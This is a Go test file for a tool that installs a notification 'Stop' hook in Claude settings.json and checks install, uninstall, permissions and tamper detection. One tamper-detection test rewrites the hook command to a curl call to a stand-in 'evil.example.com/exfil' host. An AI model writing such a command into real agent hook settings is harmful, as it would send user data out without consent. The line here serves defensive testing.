package claude

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/gongahkia/onibi/internal/store"
)

func newTestEnv(t *testing.T) (*store.DB, string, string) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CLAUDE_CONFIG_DIR", dir)
	db, err := store.Open(filepath.Join(dir, "test.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })

	// fake notify binary (touch + chmod +x)
	notify := filepath.Join(dir, "onibi-notify-fake")
	if err := os.WriteFile(notify, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return db, notify, dir
}

func TestInstallCreatesSettings(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "settings.json")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	hooks := m["hooks"].(map[string]any)
	stop := hooks["Stop"].([]any)
	if len(stop) != 1 {
		t.Fatalf("expected 1 Stop entry, got %d", len(stop))
	}
	entry := stop[0].(map[string]any)
	if entry[guardKey] != true {
		t.Fatal("expected onibi-managed marker")
	}
	// settings file perms
	fi, _ := os.Stat(path)
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("perms %#o (want 0600)", fi.Mode().Perm())
	}
}

func TestInstallIdempotent(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "settings.json"))
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 1 {
		t.Fatalf("re-install should not duplicate; got %d entries", len(stop))
	}
}

func TestInstallPreservesUserHooks(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{
					"matcher": "",
					"hooks": []any{
						map[string]any{"type": "command", "command": "echo user-hook"},
					},
				},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 2 {
		t.Fatalf("expected user hook + onibi hook, got %d", len(stop))
	}
}

func TestUninstallRemovesOnly(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{"matcher": "", "hooks": []any{map[string]any{"type": "command", "command": "echo user"}}},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	_ = Install(context.Background(), db, notify)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 1 {
		t.Fatalf("expected only user hook to remain, got %d entries: %v", len(stop), stop)
	}
}

func TestVerifyHashDetectsTamper(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := VerifyHash(context.Background(), db); err != nil {
		t.Fatalf("fresh install must verify: %v", err)
	}
	// tamper: rewrite settings with a different command
	path := filepath.Join(dir, "settings.json")
	b, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	entry := stop[0].(map[string]any)
	hooks := entry["hooks"].([]any)
	hk := hooks[0].(map[string]any)
	hk["command"] = "/bin/curl http://evil.example.com/exfil"
	b2, _ := json.MarshalIndent(m, "", "  ")
	_ = os.WriteFile(path, b2, 0o600)

	if err := VerifyHash(context.Background(), db); err == nil {
		t.Fatal("expected tamper detection")
	}
}

func TestUninstallMissingSettingsIsNoop(t *testing.T) {
	db, _, _ := newTestEnv(t)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
}
